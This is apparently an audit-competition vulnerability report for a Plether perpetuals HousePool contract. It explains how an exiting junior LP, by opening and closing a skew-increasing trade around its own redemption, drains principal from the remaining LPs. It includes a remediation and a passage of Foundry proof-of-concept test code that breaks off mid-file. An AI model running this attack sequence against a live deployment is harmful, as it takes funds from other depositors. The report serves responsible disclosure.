# \#97663 [SC-Critical] VPI float lets an exiting junior LP take principal from remaining LPs

**Submitted on Nov 2nd 2026 at 15:49:12 UTC by @hexwolf for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97663
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Executive Summary

Mallory can use ordinary junior LP and trader accounts to take principal from the junior LPs who remain in the pool. She requests a junior redemption, opens a skew-increasing position shortly before the redemption epoch settles, lets her redemption price against the positive VPI cash collected from that position, and then closes the position to recover the VPI component through the lifetime clamp. She needs no privileged role, stolen account, forged oracle message, or movement in the oracle mark.

The selected impact is **Direct theft of any user funds (Critical)**. In the exact-release test, Mallory owned 59.97% of junior supply and used a 1,386,000 USDG position at approximately 39.6% skew. Her LP leg gained 1,634.010066 USDG, her trader leg lost 1,108.840404 USDG, and she finished 525.169662 USDG ahead. The remaining junior LP lost 1,094.221023 USDG of marked principal at an unchanged oracle mark.

I inspected the assessed source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and ran the four local Foundry PoC files below. The suites passed 6/6, 2/2, 5/5, and 2/2 tests. Testing used only the repository contracts, MockPyth, and the mock settlement token; it did not contact a network or change any contract under `packages/perps/src`.

## Background

Plether charges VPI when a trade increases aggregate directional skew. `CfdMath.tryGetSkewCost` in `packages/perps/src/CfdMath.sol` evaluates the potential `k * S^2 / (2 * D)`, where `k` is `vpiFactor`, `S` is skew, and `D` is economic pool depth. A skew-increasing open therefore pays positive VPI into HousePool.

Junior deposit and redemption pricing is based on the pool's reconciled distributable equity. `HousePoolAccountingLib.buildReconcileSnapshot` in `packages/perps/src/libraries/HousePoolAccountingLib.sol` starts from physical pool assets, subtracts trader claims, and adds terminal marked price PnL. It does not subtract a pool-side payable for positive lifetime VPI that an open position can later reclaim.

The exact-release test installs or verifies these values from `packages/perps/DEPLOYMENT.md`:

| Parameter | Release value | Use in the PoC |
| --- | ---: | --- |
| Maintenance margin | 10 bps | Configured and asserted |
| Initial margin | 20 bps | Configured and asserted |
| Frozen-market margin | 300 bps | Configured and asserted; not reached on the live path |
| Execution fee | 4 bps | Charged on open and close |
| Frozen-close spread | 50 bps | Configured and asserted; not reached on the live path |
| `vpiFactor` | `0.01e18` | Produces the positive VPI float |
| `maxSkewRatio` | `0.4e18` | The position is approximately 39.6% of depth |
| Maximum confidence ratio | 10 bps | Configured and asserted; the profitable run uses zero confidence |
| Adverse-confidence multiplier | 2,500 bps | Configured and asserted |
| Senior exposure cap | 40,000,000 USDG | Configured and asserted |
| Maximum Senior share | 8,000 bps | Configured and asserted |

## Vulnerability Details

The transfer occurs in four steps:

1. `CfdEngineSettlementSidecar.executeOpen` in `packages/perps/src/CfdEngineSettlementSidecar.sol` debits Mallory's positive trade cost and calls `recordClaimantInflow(Revenue, CashArrived)` for the non-fee amount. The VPI charge becomes physical pool cash and LP revenue immediately.
2. The reconciliation snapshot built by `HousePoolAccountingLib.buildReconcileSnapshot` has no matching positive-VPI payable. `HousePool._settleLpEpoch` in `packages/perps/src/HousePool.sol` distributes the resulting equity and funds Mallory's matured junior redemption at the inflated junior principal.
3. `CloseAccountingLib.buildCloseState` in `packages/perps/src/libraries/CloseAccountingLib.sol` calculates a fresh close-time curve delta and clamps it so the position's lifetime VPI cannot become negative. If Mallory fully closes voluntarily, no other trade has changed aggregate skew, and close-time depth is equal to or lower than open-time depth, the gross VPI component returns the position's lifetime charge. `CloseAccountingLib.sol:110-113` states: "Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate." The clamp bounds the rebate to the position's own paid VPI, so it blocks the depth sandwich it names. It does not bound who owns the pool when the paid VPI is distributed and when it is refunded; that is the gap used here.
4. `CfdEnginePlanLib` nets the close execution fee, any frozen spread, and unpaid carry against that component and caps the cash rebate to available pool cash. In the live test the pool has enough cash, no frozen spread applies, and Mallory receives the VPI component less the ordinary close fee and dust carry. Because her inflated redemption has already removed her share of the VPI cash, the remaining junior cohort funds the close.

The lifetime clamp is important to the exploit but does not make every close a refund. Liquidation computes no fresh VPI delta. Intervening trades can reduce or reverse the close delta, and an underfunded pool can waive some or all of the action rebate. The PoC holds the relevant skew constant, closes voluntarily, and verifies sufficient cash.

`packages/perps/SECURITY.md:1036-1051` says the five-minute cutoff is a maximum-membership quiet period, not an immutable settlement snapshot, and expressly allows trading and pool accounting to change NAV after membership locks. This finding does not rely on NAV being immutable. The distinction is that the observed NAV includes cash tied to an existing position's recoverable lifetime VPI while omitting the corresponding pool-side obligation. Settling a departing cohort against that temporary float changes who receives the cash and who later pays the clamp-protected close rebate; it is not merely an ordinary realized gain or loss after membership lock.

This root cause is also distinct from the published issues. MED-24, **"LP can delay other redeemers with zero-payout refund epochs"**, concerns bounded epoch work and delayed redeemers. MED-29, **"Small redeemers can lose funded withdrawal value to the pool and seed account"**, concerns per-controller allocation rounding. SCAN-31, **"Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"**, concerns the close-time depth denominator. Here, a large fully funded redemption is priced while positive VPI float is in NAV; the lifetime clamp prevents the later gross rebate from exceeding the position's accrued VPI, but it does not prevent the earlier LP-cohort transfer.

## Exploitability Analysis

The demonstrated primitive is a permissionless transfer of junior principal. Mallory controls an ordinary junior LP address and an ordinary trader address. She waits through the deposit epoch and one-hour share cooldown, requests redemption before the five-minute cutoff, opens shortly before the boundary, settles the permissionless epoch with a valid current-hour Pyth payload, and closes through the Router FIFO on the next tick.

Repeating the cycle each ~3 hours compounds the remaining LP's loss; nothing in the pool blocks re-entry after the one-hour share cooldown.

Feasibility is constrained and should be assessed honestly. At the 40% skew cap, the zero-confidence break-even is approximately 40% of junior supply; at the maximum accepted 10 bps aggregate confidence it is approximately 58%, and some Senior-constrained configurations become unprofitable before that maximum. The exact-release runs used 59.97% of junior supply: zero confidence produced a 525.169662 USDG attacker profit, and the maximum accepted 10 bps confidence still produced a 40.809907 USDG attacker profit while the remaining junior LP lost 609.999868 USDG. A separate 20% junior-share test at 10 bps confidence lost 422.999662 USDG, while the remaining LP gained overall. The path also depends on the attacker preserving the constructed aggregate skew until the voluntary close; intervening skew, liquidation, or insufficient free cash can reduce or eliminate the rebate. These constraints affect likelihood and payout under the published rules, but they do not change the severity category of the demonstrated direct theft of user principal.

The release Senior covenant does not block the measured instance. The PoC configures the 40,000,000 USDG exposure cap and 80% share cap, deposits 1,000,000 USDG into Senior, and fully funds the 59.97% junior exit. Frozen-market margin and the frozen-close spread are not exercised because the attack runs in live mode.

The exact-release run printed these USDG-atom values (six decimals):

```text
[PASS] test_releaseParameters_selfDealtExitRemainsProfitableAndJuniorLoses()
  release MM / IM / FAD margin (bps) 10 20 300
  release execution fee / frozen-close spread (bps) 4 50
  release confidence limit / multiplier (bps) 10 2500
  release Senior exposure cap / share cap (atoms, bps) 40000000000000 8000
  attacker share of junior supply (bps) 5997
  position lots / notional (atoms) 13860 1386000000000
  VPI charged at open (atoms) 2742712735
  attacker LP gain vs deposit 1634010066
  attacker trader net (fees, carry, VPI net) -1108840404
  attacker total net 525169662
  honest LP loss over the cycle 1094221023

[PASS] test_releaseParameters_maxAcceptedConfidence_remainsProfitableAndJuniorLoses()
  maximum accepted confidence (8-decimal price units) 100000
  adverse confidence shift per execution 25000
  attacker share of junior supply (bps) 5997
  position lots / notional (atoms) 13860 1386000000000
  VPI charged at open (atoms) 2744084263
  attacker LP gain vs deposit 1842650292
  attacker trader net (fees, carry, VPI net) -1801840385
  attacker total net 40809907
  honest LP loss over the cycle 609999868
```

## Remediation

Track aggregate positive lifetime VPI for live positions as a non-distributable pool-side liability. Increase it when a position pays positive lifetime VPI, decrease or release it as that position closes or is liquidated, and subtract it from equity used for LP deposit and redemption pricing. This mirrors the existing treatment of nonwithdrawable trader-side VPI backing without changing the close lifetime clamp.

Regression coverage should include the self-dealt release path, an unrelated trader and exiting LP, close-before-settlement controls, partial closes, liquidation, offsetting positions, depth changes, nonzero confidence, the Senior covenant, cash-limited rebate waiver, and live versus frozen execution.

## Summary

At the assessed commit, positive VPI is booked into LP assets immediately while no pool-side payable follows the open position's clamp-protected ability to reclaim that VPI on a qualifying voluntary close. A large junior LP can settle its redemption against that temporary float and then recover the trader-side VPI component, taking principal from junior LPs who remain. The exact-release Router tests remain profitable at both zero confidence (+525.169662 USDG) and the maximum accepted 10 bps confidence (+40.809907 USDG); the remaining junior LP loses 1,094.221023 USDG and 609.999868 USDG, respectively, at an unchanged mark. Profitability requires a large junior share, sufficiently narrow confidence, preserved skew, and available cash, but the reproduced boundary crossing is direct theft of user principal.


## Proof of Concept

## Proof of Concept

The PoC is local and non-destructive. From the repository root, create the four files below under `packages/perps/test/poc/`. Then run these commands in Windows `cmd.exe`:

```bat
cd packages\perps
set FOUNDRY_FFI=false&& set FOUNDRY_VIA_IR=false&& set FOUNDRY_PROFILE=quick&& forge test --offline --threads 1 --match-path test/poc/VpiFloatLpTiming.t.sol -vv
set FOUNDRY_FFI=false&& set FOUNDRY_VIA_IR=false&& set FOUNDRY_PROFILE=quick&& forge test --offline --threads 1 --match-path test/poc/VpiFloatLpTimingVariants.t.sol -vv
set FOUNDRY_FFI=false&& set FOUNDRY_VIA_IR=false&& set FOUNDRY_PROFILE=quick&& forge test --offline --threads 1 --match-path test/poc/VpiFloatNoTradeLpExit.t.sol -vv
set FOUNDRY_FFI=false&& set FOUNDRY_VIA_IR=false&& set FOUNDRY_PROFILE=quick&& forge test --offline --threads 1 --match-path test/poc/VpiFloatLpTimingRelease.t.sol -vv
```

POSIX:

```sh
cd packages/perps
FOUNDRY_FFI=false FOUNDRY_VIA_IR=false FOUNDRY_PROFILE=quick forge test --offline --threads 1 \
  --match-path test/poc/VpiFloatLpTimingRelease.t.sol -vv
FOUNDRY_FFI=false FOUNDRY_VIA_IR=false FOUNDRY_PROFILE=quick forge test --offline --threads 1 \
  --match-path test/poc/VpiFloatLpTiming.t.sol -vv
FOUNDRY_FFI=false FOUNDRY_VIA_IR=false FOUNDRY_PROFILE=quick forge test --offline --threads 1 \
  --match-path test/poc/VpiFloatLpTimingVariants.t.sol -vv
FOUNDRY_FFI=false FOUNDRY_VIA_IR=false FOUNDRY_PROFILE=quick forge test --offline --threads 1 \
  --match-path test/poc/VpiFloatNoTradeLpExit.t.sol -vv
```

run `forge build` once first if dependencies are not yet installed, then use --offline

Observed suite summaries:

```text
VpiFloatLpTiming.t.sol:         6 passed; 0 failed; 0 skipped
VpiFloatLpTimingVariants.t.sol: 2 passed; 0 failed; 0 skipped
VpiFloatNoTradeLpExit.t.sol:    5 passed; 0 failed; 0 skipped
VpiFloatLpTimingRelease.t.sol:  2 passed; 0 failed; 0 skipped
```

The first suite includes the production Router attack and close-before-redemption and zero-factor controls. The second covers a stricter 50% Senior-share cap and the unprofitable 20%-share/10-bps-confidence case. The third shows an unrelated LP capturing the float without trading, a control where the trader closes first, a skew/share sweep, persistence, and the last-second cancellation choice. The fourth uses the release parameters and production Router path at both zero confidence and the maximum accepted 10 bps confidence.

The fixture's `router` is `LegacyOrderRouterHarness` (packages/perps/test/utils), a test adapter that inherits the production `OrderRouter`; it only maps the scalar `commitOrder` onto the V3 request. `executeOrder`, `settleLpEpoch`, the policy evaluator and the execution sidecar are the production contracts. Mark refreshes in the helper call `engine.updateMarkPrice` as the Router.

### `packages/perps/test/poc/VpiFloatLpTiming.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Probe: LP-vs-LP timing on the VPI float.
//
// A skew-increasing open pays VPI cash into HousePool and that cash is booked as LP revenue at once
// (CfdEngineSettlementSidecar.executeOpen -> recordClaimantInflow(Revenue, CashArrived)). The refund that the
// same position receives when it closes skew-reducing (clamped close rebate, CloseAccountingLib) is not a
// liability anywhere in the marked LP NAV (ACCOUNTING_SPEC: "anticipated ... VPI ... stay outside terminal K").
// An LP that redeems while the float is in the pool is paid f * V more than its fair share; the refund is then
// borne by the LPs who stayed. When the LP and the trader are the same party the float is created and
// destroyed on demand around the LP's own epoch settlement.
//
// Parameters: vpiFactor 0.01e18 (DEPLOYMENT.md "Initial release parameters"), everything else BasePerpTest.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

abstract contract VpiFloatLpTimingBase is BasePerpTest {

    address internal constant ATTACKER_LP = address(0xA77AC0E1);
    address internal constant ATTACKER_TRADER = address(0xA77AC0E2);
    uint256 internal constant MARK = 1e8;
    uint256 internal constant TRADER_FUNDING = 60_000e6;
    uint256 internal constant TRADER_MARGIN = 30_000e6;

    struct Numbers {
        uint256 attackerLpDeposit;
        uint256 attackerShareBps;
        uint256 vpiCharged;
        int256 navBeforeOpen;
        int256 navAfterOpen;
        int256 navAfterClose;
        uint256 honestValueBeforeOpen;
        uint256 honestValueAfterOpen;
        uint256 honestValueAfterExit;
        uint256 honestValueAfterClose;
        uint256 attackerLpAssetsOut;
        uint256 traderBalanceAfter;
        uint256 lots;
    }

    function _nav() internal view returns (int256) {
        ICfdEngineTypes.TerminalNavSnapshot memory snap = engine.terminalNavSnapshot();
        return int256(pool.totalAssets()) - int256(snap.totalTraderClaimsAssets) + snap.terminalLpPriceDeltaAssets;
    }

    /// @dev Marked value of the honest LP junior shares (the test contract funded 1,000,000 USDG in setUp).
    function _honestValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    function _refreshMark() internal {
        vm.prank(address(router));
        engine.updateMarkPrice(MARK, uint64(block.timestamp));
    }

    function _requestRedeemAll(
        address lp
    ) internal returns (uint256 requestId, uint256 shares) {
        shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        requestId = juniorVault.requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = juniorVault.claimRedeem(requestId, shares, lp, lp);
    }

    // --- flow hooks: engine-level (planner + settlement sidecar pranked as router) or real Router path ---

    function _openSkew(
        uint256 lots
    ) internal virtual {
        _open(ATTACKER_TRADER, CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, TRADER_MARGIN, MARK);
    }

    function _closeSkew(
        uint256 lots
    ) internal virtual {
        _close(ATTACKER_TRADER, CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, MARK);
    }

    function _settleEpoch(
        uint256 epochId
    ) internal virtual {
        uint256 start = pool.lpEpochStart(epochId);
        if (block.timestamp < start) {
            vm.warp(start);
        }
        _refreshMark();
        _settleLpEpochForTest();
    }

    /// @param redeemBeforeClose true: the attacker LP exit settles while the attacker skew is open (attack);
    ///        false: the attacker closes first and the LP exit settles afterwards (control).
    function _run(
        uint256 attackerLpDeposit,
        uint256 lots,
        bool redeemBeforeClose
    ) internal returns (Numbers memory n) {
        n.attackerLpDeposit = attackerLpDeposit;
        n.lots = lots;

        // 1. Attacker LP joins junior through the ordinary async path and waits out the share cooldown.
        _fundJunior(ATTACKER_LP, attackerLpDeposit);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _refreshMark();
        n.attackerShareBps = juniorVault.balanceOf(ATTACKER_LP) * 10_000 / juniorVault.totalSupply();

        // 2. Attacker LP queues a full redemption for the next epoch (request window rule applies).
        (uint256 requestEpoch,) = juniorVault.getRequestEpochWindow();
        (uint256 requestId, uint256 attackerShares) = _requestRedeemAll(ATTACKER_LP);
        assertEq(requestId, requestEpoch, "request lands in the imminent epoch");

        n.navBeforeOpen = _nav();
        n.honestValueBeforeOpen = _honestValue();

        // 3. Just before the epoch boundary the attacker trader opens a skew-increasing position at the mark.
        vm.warp(pool.lpEpochStart(requestEpoch) - 30);
        _refreshMark();
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);
        _openSkew(lots);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);
        n.vpiCharged = uint256(vpiAccrued);
        n.navAfterOpen = _nav();
        n.honestValueAfterOpen = _honestValue();

        if (!redeemBeforeClose) {
            _closeSkew(lots);
        }

        // 4. Epoch boundary: anyone settles (router-bound current-hour mark). The attacker redemption is funded
        //    at juniorPrincipal after reconcile, which includes the VPI cash.
        _settleEpoch(requestEpoch);
        assertEq(
            juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP), attackerShares, "redemption fully funded"
        );
        n.attackerLpAssetsOut = _claimRedeem(ATTACKER_LP, requestId);
        n.honestValueAfterExit = _honestValue();

        // 5. The attacker trader closes skew-reducing right after and recovers the VPI through the clamped rebate.
        if (redeemBeforeClose) {
            vm.warp(block.timestamp + 10);
            _closeSkew(lots);
        }
        n.navAfterClose = _nav();
        n.honestValueAfterClose = _honestValue();
        n.traderBalanceAfter = clearinghouse.balanceAssets(ATTACKER_TRADER);
        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(sizeAfter, 0, "position closed");
    }

    function _log(
        Numbers memory n
    ) internal pure {
        console2.log("attacker LP deposit (atoms)", n.attackerLpDeposit);
        console2.log("attacker share of junior supply (bps)", n.attackerShareBps);
        console2.log("position lots / notional (atoms)", n.lots, n.lots * 100e6);
        console2.log("VPI charged at open (atoms)", n.vpiCharged);
        console2.log("LP NAV before open", n.navBeforeOpen);
        console2.log("LP NAV after open", n.navAfterOpen);
        console2.log("LP NAV after close", n.navAfterClose);
        console2.log("honest LP value before open", n.honestValueBeforeOpen);
        console2.log("honest LP value after open", n.honestValueAfterOpen);
        console2.log("honest LP value after attacker LP exit", n.honestValueAfterExit);
        console2.log("honest LP value after attacker close", n.honestValueAfterClose);
        console2.log("attacker LP assets out", n.attackerLpAssetsOut);
        int256 lpGain = int256(n.attackerLpAssetsOut) - int256(n.attackerLpDeposit);
        int256 traderPnl = int256(n.traderBalanceAfter) - int256(TRADER_FUNDING);
        console2.log("attacker LP gain vs deposit", lpGain);
        console2.log("attacker trader net (fees, carry, VPI net)", traderPnl);
        console2.log("attacker total net", lpGain + traderPnl);
        console2.log(
            "honest LP loss over the cycle", int256(n.honestValueBeforeOpen) - int256(n.honestValueAfterClose)
        );
    }

    function _closeFee(
        uint256 lots
    ) internal pure returns (uint256) {
        return lots * 100e6 * 4 / 10_000;
    }

    function _assertAttack(
        Numbers memory n
    ) internal pure {
        uint256 expectedLpGain = n.vpiCharged * n.attackerShareBps / 10_000;
        int256 lpGain = int256(n.attackerLpAssetsOut) - int256(n.attackerLpDeposit);
        // The LP exit captures the attacker pro-rata share of the VPI float (to within 1 USDG of dust/coupon).
        assertApproxEqAbs(uint256(lpGain), expectedLpGain, 1e6, "LP gain equals share of VPI float");
        // The honest LP that stayed ends below where it started although the mark never moved.
        assertLt(n.honestValueAfterClose, n.honestValueBeforeOpen, "honest LP loses at constant mark");
        // The attacker trader got the VPI back: its only costs are the two 4 bps execution fees and dust carry.
        assertApproxEqAbs(
            TRADER_FUNDING - n.traderBalanceAfter, 2 * _closeFee(n.lots), 2e6, "trader paid fees only; VPI refunded"
        );
        assertGt(lpGain + (int256(n.traderBalanceAfter) - int256(TRADER_FUNDING)), 0, "attacker nets a profit");
    }

    /// @dev In the controls the only LP-side effect left is the close execution fee that the pool retains when a
    ///      VPI rebate offsets it (a separate low-severity item: treasury under-collects). It is bounded by 4 bps of
    ///      the closed notional and is unrelated to the float; the float share itself must not be captured.
    function _assertNoFloatCapture(
        Numbers memory n
    ) internal pure {
        int256 lpGain = int256(n.attackerLpAssetsOut) - int256(n.attackerLpDeposit);
        uint256 floatShare = n.vpiCharged * n.attackerShareBps / 10_000;
        uint256 retainedFeeShare = _closeFee(n.lots) * n.attackerShareBps / 10_000;
        assertLe(lpGain, int256(retainedFeeShare) + 1e6, "exit at fair NAV returns at most deposit plus fee dust");
        if (floatShare > 0) {
            assertLt(uint256(lpGain), floatShare / 4, "no share of the VPI float is captured");
        }
        assertGe(n.honestValueAfterClose + 1e6, n.honestValueBeforeOpen, "honest LP not diluted");
    }

}

/// @dev Deployed VPI factor (DEPLOYMENT.md): 0.01e18. Fixture skew cap 40%. Engine-level order path.
contract VpiFloatLpTimingTest is VpiFloatLpTimingBase {

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        CfdTypes.RiskParams memory p = super._riskParams();
        p.vpiFactor = 0.01e18;
        return p;
    }

    /// @notice Attack: attacker LP (about half of junior) exits while its own 35% skew is open, then closes.
    function test_attackerLpExitsAtVpiInflatedNav_halfOfJunior() public {
        Numbers memory n = _run(1_000_000e6, 7000, true);
        _log(n);
        _assertAttack(n);
    }

    /// @notice Attack at the 40% skew cap with a 60% junior share (redemption still funded by free cash).
    function test_attackerLpExitsAtVpiInflatedNav_sixtyPercentAtCap() public {
        // depth about 2,502,000: 9,900 lots = 990,000 notional = 39.6% skew.
        Numbers memory n = _run(1_500_000e6, 9900, true);
        _log(n);
        _assertAttack(n);
    }

    /// @notice Control 1: identical flows but the close executes before the LP exit settles. No float capture.
    function test_control_redeemAfterCloseCapturesNothing() public {
        Numbers memory n = _run(1_000_000e6, 7000, false);
        _log(n);
        _assertNoFloatCapture(n);
    }

}

/// @dev Control 2: vpiFactor 0 (BasePerpTest default). Same timing, no float, no transfer.
contract VpiFloatLpTimingZeroFactorControl is VpiFloatLpTimingBase {

    function test_control_zeroVpiFactorNoTransfer() public {
        Numbers memory n = _run(1_000_000e6, 7000, true);
        _log(n);
        assertEq(n.vpiCharged, 0, "no VPI at factor zero");
        _assertNoFloatCapture(n);
    }

}

/// @dev Reachability: the same attack through the production entry points. The attacker trader commits through
///      OrderRouter.commitOrder and executes its own order (self-execution returns the bounty to the source), the
///      attacker LP settles its own epoch through the permissionless OrderRouter.settleLpEpoch with a live Pyth
///      payload (PoolReconcile policy, current-hour component), and the close goes through the FIFO again.
contract VpiFloatLpTimingRouterPathTest is VpiFloatLpTimingBase {

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        CfdTypes.RiskParams memory p = super._riskParams();
        p.vpiFactor = 0.01e18;
        return p;
    }

    function _basketData(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, 0));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _openSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId =
            router.commitOrder(CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, TRADER_MARGIN, MARK, false);
        bytes[] memory data = _mockPythUpdateData(MARK);
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function _closeSkew(
        uint256 lots
    ) internal override {
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.SHORT, lots * CfdTypes.SIZE_QUANTUM, 0, 0, true);
        bytes[] memory data = _mockPythUpdateData(MARK);
        vm.prank(ATTACKER_TRADER);
        router.executeOrder(orderId, data);
    }

    function _settleEpoch(
        uint256 epochId
    ) internal override {
        uint256 start = pool.lpEpochStart(epochId);
        if (block.timestamp < start) {
            vm.warp(start);
        }
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(MARK)), int32(-8), block.timestamp);
        vm.prank(ATTACKER_LP);
        router.settleLpEpoch(_basketData(MARK, block.timestamp));
    }

    function test_routerPath_attackerLpExitsAtVpiInflatedNav() public {
        Numbers memory n = _run(1_000_000e6, 7000, true);
        _log(n);
        _assertAttack(n);
    }

    function test_routerPath_control_redeemAfterClose() public {
        Numbers memory n = _run(1_000_000e6, 7000, false);
        _log(n);
        _assertNoFloatCapture(n);
    }

}
```

### `packages/perps/test/poc/VpiFloatLpTimingVariants.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

import {VpiFloatLpTimingBase} from "./VpiFloatLpTiming.t.sol";

contract VpiFloatLpTimingSeniorCapVariant is VpiFloatLpTimingBase {

    address internal constant SENIOR_LP = address(0xA77AC0E3);
    uint256 internal constant ATTACKER_DEPOSIT = 1_334_666e6;
    uint256 internal constant SENIOR_DEPOSIT = 999_998e6;
    uint256 internal constant SENIOR_SHARE_CAP_BPS = 5000;
    uint256 internal constant POSITION_LOTS = 13_200;

    struct SeniorNumbers {
        uint256 seniorShareBps;
        uint256 attackerOwnershipBps;
        uint256 fundedAttackerBps;
        uint256 fundedJuniorSupplyBps;
        uint256 vpiCharged;
        uint256 assetsOut;
        uint256 residualMarkedValue;
        int256 attackerEconomicNet;
        uint256 honestBefore;
        uint256 honestAfter;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
    }

    function _prepareTranches() private returns (uint256 attackerShares, uint256 totalJuniorShares) {
        _setSeniorCapacity(type(uint256).max - 1, SENIOR_SHARE_CAP_BPS);
        _fundJunior(ATTACKER_LP, ATTACKER_DEPOSIT);
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _refreshMark();
        attackerShares = juniorVault.balanceOf(ATTACKER_LP);
        totalJuniorShares = juniorVault.totalSupply();
    }

    function _fundInflatedExit(
        uint256 requestEpoch,
        uint256 requestId
    ) private returns (uint256 fundedShares, uint256 assetsOut, uint256 vpiCharged) {
        vm.warp(pool.lpEpochStart(requestEpoch) - 30);
        _refreshMark();
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);
        _openSkew(POSITION_LOTS);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);
        vpiCharged = uint256(vpiAccrued);
        _settleEpoch(requestEpoch);
        fundedShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
        assertGt(fundedShares, 0, "senior covenant must permit a partial exit");
        vm.prank(ATTACKER_LP);
        assetsOut = juniorVault.claimRedeem(requestId, fundedShares, ATTACKER_LP, ATTACKER_LP);
    }

    function _runSeniorScenario() private returns (SeniorNumbers memory numbers) {
        (uint256 attackerShares, uint256 totalJuniorShares) = _prepareTranches();
        numbers.seniorShareBps = pool.seniorPrincipal() * 10_000 / (pool.seniorPrincipal() + pool.juniorPrincipal());
        numbers.attackerOwnershipBps = attackerShares * 10_000 / totalJuniorShares;
        (uint256 requestEpoch,) = juniorVault.getRequestEpochWindow();
        (uint256 requestId,) = _requestRedeemAll(ATTACKER_LP);

        numbers.honestBefore = _honestValue();
        (uint256 fundedShares, uint256 assetsOut, uint256 vpiCharged) = _fundInflatedExit(requestEpoch, requestId);
        numbers.fundedAttackerBps = fundedShares * 10_000 / attackerShares;
        numbers.fundedJuniorSupplyBps = fundedShares * 10_000 / totalJuniorShares;
        numbers.assetsOut = assetsOut;
        numbers.vpiCharged = vpiCharged;

        vm.warp(block.timestamp + 10);
        _closeSkew(POSITION_LOTS);
        uint256 pendingShares = juniorVault.pendingRedeemRequest(requestId, ATTACKER_LP);
        numbers.residualMarkedValue = juniorVault.convertToAssets(pendingShares);
        numbers.attackerEconomicNet = int256(assetsOut + numbers.residualMarkedValue) - int256(ATTACKER_DEPOSIT)
            + int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - int256(TRADER_FUNDING);
        numbers.honestAfter = _honestValue();
    }

    function _logSeniorNumbers(
        SeniorNumbers memory numbers
    ) private pure {
        console2.log("senior share before attack settlement (bps)", numbers.seniorShareBps);
        console2.log("attacker junior ownership before funding (bps)", numbers.attackerOwnershipBps);
        console2.log("funded attacker request (bps)", numbers.fundedAttackerBps);
        console2.log("funded total junior supply (bps)", numbers.fundedJuniorSupplyBps);
        console2.log("VPI charged (atoms)", numbers.vpiCharged);
        console2.log("attacker assets out / residual marked value", numbers.assetsOut, numbers.residualMarkedValue);
        console2.log("attacker economic net including residual junior value", numbers.attackerEconomicNet);
        console2.log("honest junior loss", int256(numbers.honestBefore) - int256(numbers.honestAfter));
    }

    function test_seniorThirtyPercentAndFiftyPercentCap_allowsProfitableCappedFullExit() public {
        SeniorNumbers memory numbers = _runSeniorScenario();
        _logSeniorNumbers(numbers);
        assertApproxEqAbs(numbers.seniorShareBps, 3000, 2, "senior tranche should be approximately thirty percent");
        assertEq(numbers.fundedAttackerBps, 10_000, "capped-size attacker should receive its full requested exit");
        assertApproxEqAbs(numbers.fundedJuniorSupplyBps, 5714, 2, "senior covenant caps full exit near four sevenths");
        assertGt(numbers.attackerEconomicNet, 0, "profit should survive at the maximum fully fundable attacker size");
        assertLt(numbers.honestAfter, numbers.honestBefore, "remaining junior LP still loses at a constant mark");
    }

}

contract VpiFloatLpTimingTwentyPercentConfidenceVariant is VpiFloatLpTimingBase {

    uint256 internal constant MAX_CONFIDENCE = MARK * 10 / 10_000;
